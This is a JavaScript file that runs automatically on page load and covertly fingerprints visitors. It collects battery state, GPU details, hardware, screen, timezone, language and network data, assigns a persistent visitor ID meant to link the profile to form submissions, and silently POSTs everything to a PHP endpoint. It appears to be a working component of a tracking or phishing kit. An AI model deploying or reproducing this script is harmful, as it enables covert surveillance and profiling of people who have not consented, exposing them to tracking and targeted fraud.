// -----------------------------------------------------
// 1. DEVICE INFO & FINGERPRINTING (Enhanced)
// -----------------------------------------------------
function information() {
  // Battery (still async)
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function getGPU() {
  var canvas = document.createElement('canvas');
  var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  var ven = 'Unknown', ren = 'Unknown';
  if (gl) {
    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  }
  return { ven: ven, ren: ren };
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform || 'Unknown';
  var cc = navigator.hardwareConcurrency || 'Unknown';
  var ram = navigator.deviceMemory || 'Unknown';
  var ver = navigator.userAgent;

  // Browser Detection
  var brw = 'Unknown';
  if (ver.includes('Edg')) brw = 'Edge';
  else if (ver.includes('Firefox')) brw = 'Firefox';
  else if (ver.includes('Chrome')) brw = 'Chrome';
  else if (ver.includes('Safari')) brw = 'Safari';

  // OS Detection
  var os = "Unknown";
  if (ver.includes("Win")) os = "Windows";
  else if (ver.includes("Android")) os = "Android";
  else if (ver.includes("like Mac")) os = "iOS";
  else if (ver.includes("Mac")) os = "MacOS";
  else if (ver.includes("Linux")) os = "Linux";

  var ht = window.screen.height || 0;
  var wd = window.screen.width || 0;
  var colorDepth = window.screen.colorDepth || 'Unknown';
  var pixelRatio = window.devicePixelRatio || 'Unknown';
  
  // Time zone
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
  
  // Language
  var language = navigator.language || navigator.userLanguage || 'Unknown';
  
  // Network connection (if available)
  var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  var connType = 'Unknown', downlink = 'Unknown', rtt = 'Unknown';
  if (connection) {
    connType = connection.effectiveType || 'Unknown';
    downlink = connection.downlink || 'Unknown';
    rtt = connection.rtt || 'Unknown';
  }
  
  var gpu = getGPU();

  // Generate a simple visitor ID (for correlation with form submission)
  var visitorId = localStorage.getItem('visitor_id');
  if (!visitorId) {
    visitorId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
    localStorage.setItem('visitor_id', visitorId);
  }

  // Send data to PHP
  $.ajax({
    type: 'POST',
    url: info_file,
    data: { 
        Ptf: ptf, 
        Brw: brw, 
        Cc: cc, 
        Ram: ram, 
        Ht: ht, 
        Wd: wd, 
        Os: os, 
        Bat: batLevel,
        Ven: gpu.ven,
        Ren: gpu.ren,
        Timezone: timezone,
        Language: language,
        ColorDepth: colorDepth,
        PixelRatio: pixelRatio,
        ConnType: connType,
        Downlink: downlink,
        RTT: rtt,
        VisitorId: visitorId
    },
    success: function() {},
    mimeType: 'text'
  });
}

// Automatically trigger
information();
